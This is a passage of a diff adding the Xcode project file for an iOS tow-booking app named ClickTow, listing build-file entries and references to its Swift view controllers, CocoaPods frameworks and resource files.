@@ -1,0 +1,1220 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 55;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		1D0748CFF4D28FA3DCF58CDC /* Pods_ClickTow.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 74A09DF6B8FC3507D97E0A3E /* Pods_ClickTow.framework */; };
+		3D70526B7A759BCF46F199BB /* Pods_ClickTow_ClickTowUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 711AE8273E9BBF59A007A571 /* Pods_ClickTow_ClickTowUITests.framework */; };
+		572BF983DA245CA809A41CDE /* Pods_ClickTowTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0F5621B990B8C3C87F7E07D5 /* Pods_ClickTowTests.framework */; };
+		C60B9D622996058D00BAAD35 /* ActivitiesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C60B9D612996058D00BAAD35 /* ActivitiesVC.swift */; };
+		C60B9D6429960A5900BAAD35 /* ConfirmToVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C60B9D6329960A5900BAAD35 /* ConfirmToVC.swift */; };
+		C60B9D67299613C000BAAD35 /* PaymentOptionsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C60B9D66299613C000BAAD35 /* PaymentOptionsVC.swift */; };
+		C60B9D692996521600BAAD35 /* ActivitiesCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C60B9D682996521600BAAD35 /* ActivitiesCell.swift */; };
+		C613AB60299E301C007ECE65 /* MyEarningVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB5F299E301C007ECE65 /* MyEarningVC.swift */; };
+		C613AB62299E31C4007ECE65 /* DriverProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB61299E31C4007ECE65 /* DriverProfileVC.swift */; };
+		C613AB64299E4574007ECE65 /* DriverProfileCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB63299E4574007ECE65 /* DriverProfileCell.swift */; };
+		C613AB66299E5661007ECE65 /* MyDocsDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB65299E5661007ECE65 /* MyDocsDetailsVC.swift */; };
+		C613AB68299E5ECD007ECE65 /* MyVehicleDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB67299E5ECD007ECE65 /* MyVehicleDetailsVC.swift */; };
+		C613AB6A299E62EF007ECE65 /* DriverNotificationSettings.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB69299E62EF007ECE65 /* DriverNotificationSettings.swift */; };
+		C613AB6C299F3A85007ECE65 /* AddProfessionalDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB6B299F3A85007ECE65 /* AddProfessionalDetailsVC.swift */; };
+		C613AB6E299F3C97007ECE65 /* AddyourvehicleVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB6D299F3C97007ECE65 /* AddyourvehicleVC.swift */; };
+		C613AB70299F455D007ECE65 /* AccountRequestVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C613AB6F299F455D007ECE65 /* AccountRequestVC.swift */; };
+		C63BE27229B86EBF00CA8DB8 /* CreditCardVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C63BE27129B86EBF00CA8DB8 /* CreditCardVC.swift */; };
+		C646EA2129B0B0F200DB4981 /* TextfieldExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = C646EA2029B0B0F200DB4981 /* TextfieldExtension.swift */; };
+		C67B217529CACA6900FDA322 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = C67B217429CACA6900FDA322 /* GoogleService-Info.plist */; };
+		C67B217729CB14DD00FDA322 /* merchant_id.cer in Resources */ = {isa = PBXBuildFile; fileRef = C67B217629CB14DD00FDA322 /* merchant_id.cer */; };
+		C6850D0B2993C3EF0097A6FD /* Indicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6850D0A2993C3EF0097A6FD /* Indicator.swift */; };
+		C690AEC529D1A73E0044937A /* CompletionRequestVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C690AEC429D1A73E0044937A /* CompletionRequestVC.swift */; };
+		C690AEC729D1A7860044937A /* CompletionRequestCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C690AEC629D1A7860044937A /* CompletionRequestCell.swift */; };
+		C690AEC929D1BF440044937A /* RateTripVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C690AEC829D1BF440044937A /* RateTripVC.swift */; };
+		C6A388042994ADD4000C34F3 /* ButtonExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6A388032994ADD4000C34F3 /* ButtonExtension.swift */; };
+		C6A388082994B416000C34F3 /* CreateprofileVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6A388072994B416000C34F3 /* CreateprofileVc.swift */; };
+		C6B3387F29BAF88200A508E4 /* CancelRequestVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6B3387E29BAF88200A508E4 /* CancelRequestVC.swift */; };
+		C6B3388629BB3C6700A508E4 /* ChatCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6B3388529BB3C6700A508E4 /* ChatCell.swift */; };
+		C6B3388829BB3DB100A508E4 /* ChatingVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6B3388729BB3DB100A508E4 /* ChatingVc.swift */; };
+		C6BE36072994DB68004A9F70 /* HomeScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE36062994DB68004A9F70 /* HomeScreenVC.swift */; };
+		C6BE36092994E174004A9F70 /* UserTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE36082994E174004A9F70 /* UserTabBar.swift */; };
+		C6BE360B29950007004A9F70 /* BookRideVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE360A29950007004A9F70 /* BookRideVC.swift */; };
+		C6BE360D29951A88004A9F70 /* SelectVehicleVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE360C29951A88004A9F70 /* SelectVehicleVC.swift */; };
+		C6BE361029951AE7004A9F70 /* SelectVehicleCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE360F29951AE7004A9F70 /* SelectVehicleCell.swift */; };
+		C6BE361229951B09004A9F70 /* NotificationsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE361129951B09004A9F70 /* NotificationsCell.swift */; };
+		C6BE361429951C11004A9F70 /* NotificationVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6BE361329951C11004A9F70 /* NotificationVc.swift */; };
+		C6C092E9299F505B00F621CF /* SideMenuLogoutVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6C092E8299F505B00F621CF /* SideMenuLogoutVC.swift */; };
+		C6CA1D75299E04ED00F92BB1 /* DriverActivityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6CA1D74299E04ED00F92BB1 /* DriverActivityVC.swift */; };
+		C6CA1D77299E051200F92BB1 /* DriverActivityCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6CA1D76299E051200F92BB1 /* DriverActivityCell.swift */; };
+		C6D22B3029D43D2E005A5BCD /* ColorsExetension.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D22B2F29D43D2E005A5BCD /* ColorsExetension.swift */; };
+		C6D22B3229D55D5F005A5BCD /* AccountasVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D22B3129D55D5F005A5BCD /* AccountasVC.swift */; };
+		C6D22B3429D58C50005A5BCD /* PushNotification.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D22B3329D58C50005A5BCD /* PushNotification.swift */; };
+		C6D22B3629D5B3F5005A5BCD /* DriverTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D22B3529D5B3F5005A5BCD /* DriverTabBar.swift */; };
+		C6D3BDDA299CDB8600C43918 /* DriverHomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D3BDD9299CDB8600C43918 /* DriverHomeVC.swift */; };
+		C6D3BDDC299CE83700C43918 /* SideMenuVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D3BDDB299CE83700C43918 /* SideMenuVC.swift */; };
+		C6D3BDDF299D4BFE00C43918 /* SideMenuCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6D3BDDE299D4BFE00C43918 /* SideMenuCell.swift */; };
+		C6DD0EA0299578DA000AC711 /* profileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0E9F299578DA000AC711 /* profileVC.swift */; };
+		C6DD0EA229957A9A000AC711 /* profileCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EA129957A9A000AC711 /* profileCell.swift */; };
+		C6DD0EA429957E22000AC711 /* editprofileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EA329957E22000AC711 /* editprofileVC.swift */; };
+		C6DD0EA62995834D000AC711 /* settingsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EA52995834D000AC711 /* settingsVC.swift */; };
+		C6DD0EA829958371000AC711 /* settingsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EA729958371000AC711 /* settingsCell.swift */; };
+		C6DD0EAA299589C7000AC711 /* logoutVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EA9299589C7000AC711 /* logoutVC.swift */; };
+		C6DD0EAC29958AED000AC711 /* helpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EAB29958AED000AC711 /* helpVC.swift */; };
+		C6DD0EAE29958FC1000AC711 /* NotificationSettingsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EAD29958FC1000AC711 /* NotificationSettingsVC.swift */; };
+		C6DD0EB029959131000AC711 /* passwordChangeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EAF29959131000AC711 /* passwordChangeVC.swift */; };
+		C6DD0EB229959379000AC711 /* Tems&ConditionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EB129959379000AC711 /* Tems&ConditionVC.swift */; };
+		C6DD0EB4299593A3000AC711 /* PrivacPolicyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EB3299593A3000AC711 /* PrivacPolicyVC.swift */; };
+		C6DD0EB629959510000AC711 /* aboutVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EB529959510000AC711 /* aboutVC.swift */; };
+		C6DD0EB829959689000AC711 /* deleteAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6DD0EB729959689000AC711 /* deleteAccountVC.swift */; };
+		C6E2496B29C075BF00DA61C3 /* RequestCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6E2496A29C075BF00DA61C3 /* RequestCollectionViewCell.swift */; };
+		C6F301B12992BA5E00A2916A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301B02992BA5E00A2916A /* AppDelegate.swift */; };
+		C6F301B32992BA5E00A2916A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301B22992BA5E00A2916A /* SceneDelegate.swift */; };
+		C6F301B82992BA5E00A2916A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = C6F301B62992BA5E00A2916A /* Main.storyboard */; };
+		C6F301BA2992BA6100A2916A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = C6F301B92992BA6100A2916A /* Assets.xcassets */; };
+		C6F301BD2992BA6100A2916A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = C6F301BB2992BA6100A2916A /* LaunchScreen.storyboard */; };
+		C6F301C82992BA6100A2916A /* ClickTowTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301C72992BA6100A2916A /* ClickTowTests.swift */; };
+		C6F301D22992BA6100A2916A /* ClickTowUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301D12992BA6100A2916A /* ClickTowUITests.swift */; };
+		C6F301D42992BA6100A2916A /* ClickTowUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301D32992BA6100A2916A /* ClickTowUITestsLaunchTests.swift */; };
+		C6F301E22992BB4800A2916A /* SigninVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301E12992BB4800A2916A /* SigninVC.swift */; };
+		C6F301E42992BB6400A2916A /* SignupVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301E32992BB6400A2916A /* SignupVC.swift */; };
+		C6F301E62992BB9900A2916A /* ChoseAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301E52992BB9900A2916A /* ChoseAccountVC.swift */; };
+		C6F301E82992BBBB00A2916A /* ForgotpasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301E72992BBBB00A2916A /* ForgotpasswordVC.swift */; };
+		C6F301EA2992BBDD00A2916A /* OtpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301E92992BBDD00A2916A /* OtpVC.swift */; };
+		C6F301EE2992BC4200A2916A /* AddUserLocationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301ED2992BC4200A2916A /* AddUserLocationVC.swift */; };
+		C6F301F12993B0FC00A2916A /* Helper.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301F02993B0FC00A2916A /* Helper.swift */; };
+		C6F301F32993B11900A2916A /* Classess.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301F22993B11900A2916A /* Classess.swift */; };
+		C6F301F52993B15E00A2916A /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301F42993B15E00A2916A /* Extensions.swift */; };
+		C6F301F72993B18000A2916A /* Designing.swift in Sources */ = {isa = PBXBuildFile; fileRef = C6F301F62993B18000A2916A /* Designing.swift */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		C6F301C42992BA6100A2916A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C6F301A52992BA5E00A2916A /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = C6F301AC2992BA5E00A2916A;
+			remoteInfo = ClickTow;
+		};
+		C6F301CE2992BA6100A2916A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C6F301A52992BA5E00A2916A /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = C6F301AC2992BA5E00A2916A;
+			remoteInfo = ClickTow;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		075C7660490457D67D090BF2 /* Pods-ClickTow-ClickTowUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTow-ClickTowUITests.debug.xcconfig"; path = "Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		0F5621B990B8C3C87F7E07D5 /* Pods_ClickTowTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ClickTowTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		1873581A770A4EFF8CC75042 /* Pods-ClickTow.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTow.release.xcconfig"; path = "Target Support Files/Pods-ClickTow/Pods-ClickTow.release.xcconfig"; sourceTree = "<group>"; };
+		3BD44B1A3A1B998F26C66C0D /* Pods-ClickTowTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTowTests.debug.xcconfig"; path = "Target Support Files/Pods-ClickTowTests/Pods-ClickTowTests.debug.xcconfig"; sourceTree = "<group>"; };
+		711AE8273E9BBF59A007A571 /* Pods_ClickTow_ClickTowUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ClickTow_ClickTowUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		74A09DF6B8FC3507D97E0A3E /* Pods_ClickTow.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ClickTow.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		954A8AA413622407489BAF7B /* Pods-ClickTowTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTowTests.release.xcconfig"; path = "Target Support Files/Pods-ClickTowTests/Pods-ClickTowTests.release.xcconfig"; sourceTree = "<group>"; };
+		A08123675AE798CD08180157 /* Pods-ClickTow-ClickTowUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTow-ClickTowUITests.release.xcconfig"; path = "Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests.release.xcconfig"; sourceTree = "<group>"; };
+		C60B9D612996058D00BAAD35 /* ActivitiesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ActivitiesVC.swift; sourceTree = "<group>"; };
+		C60B9D6329960A5900BAAD35 /* ConfirmToVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConfirmToVC.swift; sourceTree = "<group>"; };
+		C60B9D66299613C000BAAD35 /* PaymentOptionsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentOptionsVC.swift; sourceTree = "<group>"; };
+		C60B9D682996521600BAAD35 /* ActivitiesCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ActivitiesCell.swift; sourceTree = "<group>"; };
+		C613AB5F299E301C007ECE65 /* MyEarningVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyEarningVC.swift; sourceTree = "<group>"; };
+		C613AB61299E31C4007ECE65 /* DriverProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverProfileVC.swift; sourceTree = "<group>"; };
+		C613AB63299E4574007ECE65 /* DriverProfileCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverProfileCell.swift; sourceTree = "<group>"; };
+		C613AB65299E5661007ECE65 /* MyDocsDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyDocsDetailsVC.swift; sourceTree = "<group>"; };
+		C613AB67299E5ECD007ECE65 /* MyVehicleDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyVehicleDetailsVC.swift; sourceTree = "<group>"; };
+		C613AB69299E62EF007ECE65 /* DriverNotificationSettings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverNotificationSettings.swift; sourceTree = "<group>"; };
+		C613AB6B299F3A85007ECE65 /* AddProfessionalDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddProfessionalDetailsVC.swift; sourceTree = "<group>"; };
+		C613AB6D299F3C97007ECE65 /* AddyourvehicleVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddyourvehicleVC.swift; sourceTree = "<group>"; };
+		C613AB6F299F455D007ECE65 /* AccountRequestVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountRequestVC.swift; sourceTree = "<group>"; };
+		C63BE27129B86EBF00CA8DB8 /* CreditCardVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreditCardVC.swift; sourceTree = "<group>"; };
+		C646EA2029B0B0F200DB4981 /* TextfieldExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextfieldExtension.swift; sourceTree = "<group>"; };
+		C67B217329CA9D2400FDA322 /* ClickTow.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = ClickTow.entitlements; sourceTree = "<group>"; };
+		C67B217429CACA6900FDA322 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		C67B217629CB14DD00FDA322 /* merchant_id.cer */ = {isa = PBXFileReference; lastKnownFileType = file; path = merchant_id.cer; sourceTree = "<group>"; };
+		C6850D0A2993C3EF0097A6FD /* Indicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Indicator.swift; sourceTree = "<group>"; };
+		C690AEC429D1A73E0044937A /* CompletionRequestVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompletionRequestVC.swift; sourceTree = "<group>"; };
+		C690AEC629D1A7860044937A /* CompletionRequestCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompletionRequestCell.swift; sourceTree = "<group>"; };
+		C690AEC829D1BF440044937A /* RateTripVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RateTripVC.swift; sourceTree = "<group>"; };
+		C6A388032994ADD4000C34F3 /* ButtonExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ButtonExtension.swift; sourceTree = "<group>"; };
+		C6A388072994B416000C34F3 /* CreateprofileVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateprofileVc.swift; sourceTree = "<group>"; };
+		C6B3387E29BAF88200A508E4 /* CancelRequestVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelRequestVC.swift; sourceTree = "<group>"; };
+		C6B3388529BB3C6700A508E4 /* ChatCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatCell.swift; sourceTree = "<group>"; };
+		C6B3388729BB3DB100A508E4 /* ChatingVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatingVc.swift; sourceTree = "<group>"; };
+		C6BE36062994DB68004A9F70 /* HomeScreenVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeScreenVC.swift; sourceTree = "<group>"; };
+		C6BE36082994E174004A9F70 /* UserTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserTabBar.swift; sourceTree = "<group>"; };
+		C6BE360A29950007004A9F70 /* BookRideVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookRideVC.swift; sourceTree = "<group>"; };
+		C6BE360C29951A88004A9F70 /* SelectVehicleVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectVehicleVC.swift; sourceTree = "<group>"; };
+		C6BE360F29951AE7004A9F70 /* SelectVehicleCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectVehicleCell.swift; sourceTree = "<group>"; };
+		C6BE361129951B09004A9F70 /* NotificationsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsCell.swift; sourceTree = "<group>"; };
+		C6BE361329951C11004A9F70 /* NotificationVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVc.swift; sourceTree = "<group>"; };
+		C6C092E8299F505B00F621CF /* SideMenuLogoutVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuLogoutVC.swift; sourceTree = "<group>"; };
+		C6CA1D74299E04ED00F92BB1 /* DriverActivityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverActivityVC.swift; sourceTree = "<group>"; };
+		C6CA1D76299E051200F92BB1 /* DriverActivityCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverActivityCell.swift; sourceTree = "<group>"; };
+		C6D22B2F29D43D2E005A5BCD /* ColorsExetension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ColorsExetension.swift; sourceTree = "<group>"; };
+		C6D22B3129D55D5F005A5BCD /* AccountasVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountasVC.swift; sourceTree = "<group>"; };
+		C6D22B3329D58C50005A5BCD /* PushNotification.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PushNotification.swift; sourceTree = "<group>"; };
+		C6D22B3529D5B3F5005A5BCD /* DriverTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverTabBar.swift; sourceTree = "<group>"; };
+		C6D3BDD9299CDB8600C43918 /* DriverHomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriverHomeVC.swift; sourceTree = "<group>"; };
+		C6D3BDDB299CE83700C43918 /* SideMenuVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuVC.swift; sourceTree = "<group>"; };
+		C6D3BDDE299D4BFE00C43918 /* SideMenuCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuCell.swift; sourceTree = "<group>"; };
+		C6DD0E9F299578DA000AC711 /* profileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = profileVC.swift; sourceTree = "<group>"; };
+		C6DD0EA129957A9A000AC711 /* profileCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = profileCell.swift; sourceTree = "<group>"; };
+		C6DD0EA329957E22000AC711 /* editprofileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = editprofileVC.swift; sourceTree = "<group>"; };
+		C6DD0EA52995834D000AC711 /* settingsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = settingsVC.swift; sourceTree = "<group>"; };
+		C6DD0EA729958371000AC711 /* settingsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = settingsCell.swift; sourceTree = "<group>"; };
+		C6DD0EA9299589C7000AC711 /* logoutVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = logoutVC.swift; sourceTree = "<group>"; };
+		C6DD0EAB29958AED000AC711 /* helpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = helpVC.swift; sourceTree = "<group>"; };
+		C6DD0EAD29958FC1000AC711 /* NotificationSettingsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationSettingsVC.swift; sourceTree = "<group>"; };
+		C6DD0EAF29959131000AC711 /* passwordChangeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = passwordChangeVC.swift; sourceTree = "<group>"; };
+		C6DD0EB129959379000AC711 /* Tems&ConditionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Tems&ConditionVC.swift"; sourceTree = "<group>"; };
+		C6DD0EB3299593A3000AC711 /* PrivacPolicyVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacPolicyVC.swift; sourceTree = "<group>"; };
+		C6DD0EB529959510000AC711 /* aboutVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = aboutVC.swift; sourceTree = "<group>"; };
+		C6DD0EB729959689000AC711 /* deleteAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = deleteAccountVC.swift; sourceTree = "<group>"; };
+		C6E2496A29C075BF00DA61C3 /* RequestCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RequestCollectionViewCell.swift; sourceTree = "<group>"; };
+		C6F301AD2992BA5E00A2916A /* ClickTow.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ClickTow.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		C6F301B02992BA5E00A2916A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		C6F301B22992BA5E00A2916A /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		C6F301B72992BA5E00A2916A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		C6F301B92992BA6100A2916A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		C6F301BC2992BA6100A2916A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		C6F301BE2992BA6100A2916A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		C6F301C32992BA6100A2916A /* ClickTowTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ClickTowTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		C6F301C72992BA6100A2916A /* ClickTowTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClickTowTests.swift; sourceTree = "<group>"; };
+		C6F301CD2992BA6100A2916A /* ClickTowUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ClickTowUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		C6F301D12992BA6100A2916A /* ClickTowUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClickTowUITests.swift; sourceTree = "<group>"; };
